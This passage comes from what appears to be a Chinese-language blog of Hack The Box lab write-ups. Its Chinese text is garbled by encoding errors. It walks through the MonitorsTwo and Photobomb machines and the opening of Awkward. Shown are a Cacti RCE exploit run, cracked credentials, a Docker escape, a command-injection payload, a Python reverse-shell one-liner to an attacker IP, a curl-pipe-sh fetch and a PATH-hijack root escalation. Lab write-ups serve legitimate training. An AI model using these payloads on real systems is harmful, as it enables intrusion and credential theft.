fingerprint:\nOS:SCAN(V=7.93%E=4%D=5/8%OT=22%CT=1%CU=41839%PV=Y%DS=2%DC=T%G=Y%TM=64582EE3\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11\nOS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 199/tcp)\nHOP RTT       ADDRESS\n1   149.95 ms 10.10.16.1\n2   193.70 ms 10.10.11.211\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 35.93 seconds\n```\n## Http\n![](Hackthebox-MonitorsTwo/dl47lRfOTAiRq0PdOJjXsfiV8ErIJA9AoBK1hlDjQLc.png)\n\né€šè¿‡ http é¡µé¢å¾—è‡³è¯¥ cms ä¸º `Cacti 1.2.22` ï¼Œå»æœç´¢ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ¼æ´\n\n![](Hackthebox-MonitorsTwo/uroHAWRGpe33d4Fj1Es_bmeQD-lepABDdzlau3RdbyY.png)\n\næ‰¾åˆ°ä¸€ä¸ª `CVE-2022-46169` ï¼Œä¸‹è½½ä¸‹æ¥ä½¿ç”¨\n\n> [https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)\n\n# æ¼æ´åˆ©ç”¨\nä½¿ç”¨ nc å¼€å¯ä¸€ä¸ªç«¯å£ç›‘å¬\n\n```bash\nnc -nvlp 4444\n```\nç„¶åæ‰§è¡Œ exp\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/CVE-2022-46169-CACTI-1.2.22]\nâ””â”€# python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.16.23 --LPORT=4444\nChecking...\nThe target is vulnerable. Exploiting...\nBruteforcing the host_id and local_data_ids\nBruteforce Success!!\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.23] from (UNKNOWN) [10.10.11.211] 38920\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nbash-5.1$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸå¾—åˆ°ä¸€ä¸ª shell\n\n# æƒé™æå‡\n## User\n```bash\nbash-5.1$ cd /\ncd /\nbash-5.1$ ls -la\nls -la\ntotal 88\ndrwxr-xr-x   1 root root 4096 Mar 21 10:49 .\ndrwxr-xr-x   1 root root 4096 Mar 21 10:49 ..\n-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv\ndrwxr-xr-x   1 root root 4096 Mar 22 13:21 bin\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 boot\ndrwxr-xr-x   5 root root  340 May  7 22:45 dev\n-rw-r--r--   1 root root  648 Jan  5 11:37 entrypoint.sh\ndrwxr-xr-x   1 root root 4096 Mar 21 10:49 etc\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 home\ndrwxr-xr-x   1 root root 4096 Nov 15 04:13 lib\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 lib64\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 media\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 mnt\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 opt\ndr-xr-xr-x 274 root root    0 May  7 22:45 proc\ndrwx------   1 root root 4096 Mar 21 10:50 root\ndrwxr-xr-x   1 root root 4096 Nov 15 04:17 run\ndrwxr-xr-x   1 root root 4096 Jan  9 09:30 sbin\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 srv\ndr-xr-xr-x  13 root root    0 May  7 22:45 sys\ndrwxrwxrwt   1 root root 4096 May  7 23:08 tmp\ndrwxr-xr-x   1 root root 4096 Nov 14 00:00 usr\ndrwxr-xr-x   1 root root 4096 Nov 15 04:13 var\n\n```\né¦–å…ˆå‰å¾€æ ¹ç›®å½•ï¼Œçœ‹åˆ°ä¸€ä¸ªè„šæœ¬ `entrypoint.sh` ï¼Œå¹¶ä¸”çœ‹åˆ°ä¸€ä¸ª `.dockerenv` ï¼Œæ€€ç–‘æˆ‘ä»¬å½“å‰ç¯å¢ƒåœ¨ docker å®¹å™¨é‡Œ\n\næŸ¥çœ‹ä¸€ä¸‹è„šæœ¬çš„å†…å®¹\n\n```bash\nbash-5.1$ cat entrypoint.sh\ncat entrypoint.sh\n#!/bin/bash\nset -ex\n\nwait-for-it db:3306 -t 300 -- echo \"database is connected\"\nif [[ ! $(mysql --host=db --user=root --password=root cacti -e \"show tables\") =~ \"automation_devices\" ]]; then\n    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql\n    mysql --host=db --user=root --password=root cacti -e \"UPDATE user_auth SET must_change_password='' WHERE username = 'admin'\"\n    mysql --host=db --user=root --password=root cacti -e \"SET GLOBAL time_zone = 'UTC'\"\nfi\n\nchown www-data:www-data -R /var/www/html\n# first arg is `-f` or `--some-option`\nif [ \"${1#-}\" != \"$1\" ]; then\n        set -- apache2-foreground \"$@\"\nfi\n\nexec \"$@\"\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ° mysql çš„é“¾æ¥åœ°å€å’Œç™»å½•å‡­æ®\n\næ„é€ ä¸€ä¸‹ mysql è¯­å¥\n\n```bash\nmysql --host=db --user=root --password=root cacti -e \"show tables\"\nmysql --host=db --user=root --password=root cacti -e \"select * from user_auth\"\n\nadmin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC\nmarcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C\n```\nå¾—åˆ°äº†ä¸¤ä¸ª hash å€¼\n\n### John\nä½¿ç”¨ John è¿›è¡Œçˆ†ç ´\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nmarcus:funkymonkey\n\n1 password hash cracked, 0 left\n```\nçˆ†ç ´å‡ºæ¥äº†ä¸€ä¸ªè´¦å·å¯†ç ï¼Œä½¿ç”¨ ssh è¿›è¡Œç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh marcus@10.10.11.211\nmarcus@10.10.11.211's password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun 07 May 2023 11:50:19 PM UTC\n\n  System load:                      0.0\n  Usage of /:                       63.1% of 6.73GB\n  Memory usage:                     12%\n  Swap usage:                       0%\n  Processes:                        227\n  Users logged in:                  0\n  IPv4 address for br-60ea49c21773: 172.18.0.1\n  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for eth0:            10.10.11.211\n  IPv6 address for eth0:            dead:beef::250:56ff:feb9:74e1\n\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nYou have mail.\nLast login: Thu Mar 23 10:12:28 2023 from 10.10.14.40\nmarcus@monitorstwo:~$ whoami&&id\nmarcus\nuid=1000(marcus) gid=1000(marcus) groups=1000(marcus)\n```\n```bash\nmarcus@monitorstwo:~$ ls\nuser.txt\nmarcus@monitorstwo:~$ cat user.txt \n2df2af6924e2b749d747ce39010753e5\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\nåœ¨ç™»å½• Marcus çš„æ—¶å€™ï¼Œæç¤ºæˆ‘ä»¬æœ‰ä¸€å°é‚®ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nmarcus@monitorstwo:~$ cat /var/mail/marcus \nFrom: administrator@monitorstwo.htb\nTo: all@monitorstwo.htb\nSubject: Security Bulletin - Three Vulnerabilities to be Aware Of\n\nDear all,\n\nWe would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.\n\nCVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.\n\nCVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.\n\nCVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.\n\nWe encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.\n\nBest regards,\n\nAdministrator\nCISO\nMonitor Two\nSecurity Team\n```\nè¿™é‡Œæåˆ°äº†ä¸‰ä¸ª CVE æ¼æ´ï¼ŒæŒ‰ç…§æƒ…å†µåˆ†æï¼Œåº”è¯¥æ˜¯ç¬¬ä¸‰ä¸ª CVE-2021-41091\n\n> [https://github.com/UncleJ4ck/CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091)\n\nè¯¥æ¼æ´åˆ©ç”¨æœ‰ä¸‰ä¸ªæ­¥éª¤\n\n1. åœ¨ docker å®¹å™¨ä¸­è·å¾— root æƒé™\n2. åœ¨ docker å®¹å™¨ä¸­ä½¿ç”¨ `chmod u+s /bin/bash` è®¾ç½® `/bin/bash` çš„æƒé™\n3. æ‰§è¡Œ poc\n\nç°åœ¨æ¥è¿›è¡Œåˆ©ç”¨\n\n### Step 1\n```bash\nwww-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/sbin/capsh\n/bin/mount\n/bin/umount\n/bin/su\n```\næŸ¥æ‰¾å¯ä»¥æ‰§è¡Œçš„æ–‡ä»¶\n\nå‘ç°ä¸€ä¸ªå¯ç–‘çš„ `/sbin/capsh` \n\n> [https://gtfobins.github.io/gtfobins/capsh/](https://gtfobins.github.io/gtfobins/capsh/)\n\næ‰¾åˆ°äº†å…³äº capsh çš„ææƒæç¤º\n\n```bash\nwww-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 --\n/sbin/capsh --gid=0 --uid=0 --\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\n```\næˆåŠŸææƒåˆ° root\n\n### Step 2\n```bash\nchmod u+s /bin/bash\nls -la /bin/bash\n-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash\n```\nç»™ `/bin/bash` æ·»åŠ ä¸Š s æƒé™\n\n### Step 3\n```bash\nmarcus@monitorstwo:~$ ./exp.sh \n[!] Vulnerable to CVE-2021-41091\n[!] Now connect to your Docker container that is accessible and obtain root access !\n[>] After gaining root access execute this command (chmod u+s /bin/bash)\n\nDid you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes\n[!] Available Overlay2 Filesystems:\n/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\n/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\n\n[!] Iterating over the available Overlay2 filesystems !\n[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\n[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'\n\n[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\n[!] Rooted !\n[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\n[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'\n\n[!] Spawning Shell\nbash-5.1# exit\n```\næ‰§è¡Œ expï¼ŒæˆåŠŸè·å–åˆ°äº†å®¹å™¨æ‰€åœ¨çš„åœ°å€\n\n```bash\nmarcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p\nbash-5.1# whoami&&id\nroot\nuid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)\n```\næˆåŠŸææƒåˆ° root\n\n```bash\nbash-5.1# cat /root/root.txt \n45e2b87e322ce4ea1ae7f141fd210579\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Photobomb - Hackthebox","url":"/2023/05/07/Hackthebox/Easy/Hackthebox-Photobomb/","content":"\n# Hackthebox Photobomb\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Photobomb/LDSrVGy7C-CZ7F3nAHq-IuMX_R1fUhShKILYvbBmdYU.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Photobomb/Z58a5zra-7yWwrvMrcB3tRTw0RNMOFa0beuFkWJnvaM.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```Plain Text\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.182\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 23:49 EST\nNmap scan report for 10.10.11.182\nHost is up (0.26s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)\n|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)\n|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://photobomb.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/20%OT=22%CT=1%CU=41677%PV=Y%DS=2%DC=T%G=Y%TM=63A290\nOS:81%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SE\nOS:Q(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%\nOS:O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2\nOS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT       ADDRESS\n1   275.46 ms 10.10.14.1\n2   282.41 ms 10.10.11.182\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.89 seconds\n```\n## Http\n![](Hackthebox-Photobomb/tkGwDpifhm3JtLgP0-ZCkdx83b7cHyEUmLp-ik233gM.png)\n\nä¼šè¢«è·³è½¬åˆ°åŸŸå photobomb.htb å»åŠ å…¥ hosts è§£æ\n\n```Plain Text\necho 10.10.11.182 photobomb.htb >> /etc/hosts\n```\n![](Hackthebox-Photobomb/2jMWJ9zAeBFV-5nrxU0G9On-hDUfjEYANzQJJxYr4gs.png)\n\nå†è®¿é—®ä¸€æ¬¡å°±æ˜¯æ­£å¸¸çš„äº†\n\n![](Hackthebox-Photobomb/ZYCIfyfoZq4528NhfhqdT6QmomoMT6Ve6yc7QsMDChc.png)\n\né¦–é¡µæœ‰ä¸ª click hereï¼Œç‚¹å‡»åä¼šè·³è½¬ç™»é™†é¡µé¢ï¼Œå»æ‰¾ä¸€ä¸‹å¯†ç \n\n![](Hackthebox-Photobomb/9_2oS_8TL0oUNogTS5JsVPuln6yEQhwJ06j0S6TBFFo.png)\n\nåœ¨ js æ–‡ä»¶ä¸­å‘ç°ä¸€æ®µ photobomb.js\n\n```javascript\nfunction init() {\n  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me\n  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {\n    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');\n  }\n}\nwindow.onload = init;\n```\nåœ¨é‡Œé¢æ‰¾åˆ°äº†ä¸€æ®µé“¾æ¥ï¼Œé‡Œé¢åº”è¯¥å°±æ˜¯è´¦å·å¯†ç äº†\n\n![](Hackthebox-Photobomb/CJ4wo47Fx8GJ9YWKdqI0UuQCpMIc71t2WfwPkzPuGYI.png)\n\nç™»é™†æˆåŠŸ\n\n![](Hackthebox-Photobomb/ZzlaUOXNz-uE93DbPVB_jlejAXtCfmbang9vUvL8do0.png)\n\nä»–ä¸‹é¢æœ‰ä¸ªä¸‹è½½å›¾ç‰‡çš„åŠŸèƒ½ï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹\n\n![](Hackthebox-Photobomb/kc8KUSvk8sbI-nkpWxbaSmWB5dND6Qnt6lMGiFKTyn8.png)\n\nç¡®å®æ˜¯ä¸‹è½½ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°çœ‹ç€å¾ˆæœ‰æå¤´å•Šï¼Œè¿™çœ‹ç€å°±æ˜¯å¾ˆæ˜æ˜¾çš„å‘½ä»¤æ‹¼æ¥æ‰§è¡Œ\n\n![](Hackthebox-Photobomb/9apax9ywCGMJ0KkdoHbYX0ycsvCto4mMWgnG58hu2kc.png)\n\n# æ¼æ´åˆ©ç”¨\nåœ¨ filetype åé¢ä¼¼ä¹å¯ä»¥æ‹¼æ¥ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå»å¼€å¯ä¸€ä¸ª http æœåŠ¡å™¨è¯•è¯•\n\n```python\npython3 -m http.server 80\n```\n```Plain Text\nphoto=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+http://10.10.14.11&dimensions=30x20\n```\nç„¶åå»è¯·æ±‚ä¸€ä¸‹\n\n![](Hackthebox-Photobomb/AuDr59V7VTsfWQtLB40crZN8mIq4O-_Bb8Lb7mMI0hU.png)\n\nç¡®å®æœ‰å›åŒ…ï¼Œé‚£å°±è¯æ˜å¯ä»¥æ‰§è¡Œå‘½ä»¤\n\n```python\nexport RHOST=\"10.10.14.11\";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\n```\næˆ‘ä»¬æ„é€ å¥½ poc ä»¥åï¼Œä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\nç„¶åå» burp ä¸­æ‰§è¡Œ\n\n```python\nexport RHOST=\"10.10.14.11\";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\n```\n```python\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.182] 46772\nwizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwizard@photobomb:~/photobomb$ whoami&&id\nwhoami&&id\nwizard\nuid=1000(wizard) gid=1000(wizard) groups=1000(wizard)\n```\næˆåŠŸå¼¹å› shell\n\n```python\nwizard@photobomb:~$ cat user.txt\ncat user.txt\n9ef16b54cbd2be4ef91cf67b6642e804\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\nå…ˆè·‘ä¸ª linpeas çœ‹çœ‹\n\n```python\ncurl -L http://10.10.14.11/linpeas.sh|sh\n```\n```python\nwizard@photobomb:~$ sudo -l\nsudo -l\nMatching Defaults entries for wizard on photobomb:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser wizard may run the following commands on photobomb:\n    (root) SETENV: NOPASSWD: /opt/cleanup.sh\n```\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥æ— å¯†ç ä½¿ç”¨ root æƒé™æ‰§è¡Œ /opt/cleanup.shï¼Œå…ˆå»çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶\n\n```python\n#!/bin/bash\n. /opt/.bashrc\ncd /home/wizard/photobomb\n\n# clean up log files\nif [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]\nthen\n  /bin/cat log/photobomb.log > log/photobomb.log.old\n  /usr/bin/truncate -s0 log/photobomb.log\nfi\n\n# protect the priceless originals\nfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;\n```\nå¯¹äºè¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬åªæœ‰è¯»å–å’Œå†™å…¥æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å…ˆææ¸…æ¥šä»–å¹²äº†ä»€ä¹ˆ\n\nå¤§æ¦‚çœ‹äº†ä¸€ä¸‹ï¼ŒåŠŸèƒ½ç®€å•çš„è¯´å°±æ˜¯è·å–æ—¥å¿—æ–‡ä»¶å¹¶å°†å…¶å†…å®¹ç§»åŠ¨åˆ° photobonb.log.oldï¼Œç„¶åä½¿ç”¨ truncate æ¸…é™¤ photobomb.log\n\nè¿™é‡Œçš„çªç ´ç‚¹åœ¨äºæœ€åä¸€å¥ï¼Œä»–çš„ find å‘½ä»¤ä½¿ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œè€Œä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å˜ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼Œç„¶ååœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ª find æ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸€ä¸ªæ¶æ„ pocï¼Œç„¶å sudo æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±èƒ½ç›´æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„ç»“æœ\n\n```python\necho \"/bin/bash\" > find\nchmod +x find\nsudo PATH=$PWD:$PATH /opt/cleanup.sh\n```\n```python\nwizard@photobomb:~$ echo \"/bin/bash\" > find\necho \"/bin/bash\" > find\nwizard@photobomb:~$ chmod +x find\nchmod +x find\nwizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh\nsudo PATH=$PWD:$PATH /opt/cleanup.sh\nroot@photobomb:/home/wizard/photobomb# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@photobomb:/home/wizard/photobomb# whoami\nwhoami\nroot\n```\næˆåŠŸè·å¾— root æƒé™\n\n```python\nroot@photobomb:/home/wizard/photobomb# cat /root/root.txt\ncat /root/root.txt\naefec07aac4191d73f9f0e8dadd6ee58\n```\næˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Awkward - Hackthebox","url":"/2023/03/12/Hackthebox/Medium/Hackthebox-Awkward/","content":"\n# Hackthebox - Awkward\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Awkward/qHn3xqiYXz4ZPgf3GJ-T9aWJi1KEis5-ALZN7xlT4Wg.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Awkward/SdXchWAqoVujsjsuvkhGk1ZOCGEQBpynHobXTF5tTSk.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.11.185\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 01:55 CST\nNmap scan report for 10.10.11.185\nHost is up (0.083s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)\n|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=3/11%OT=22%CT=1%CU=37953%PV=Y%DS=2%DC=T%G=Y%TM=640B6F2\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1\nOS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT      ADDRESS\n1   74.06 ms 10.10.16.1\n2   75.37 ms 10.10.11.185\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 29.82 seconds\n```\n## Http\nè¿™è¾¹ web 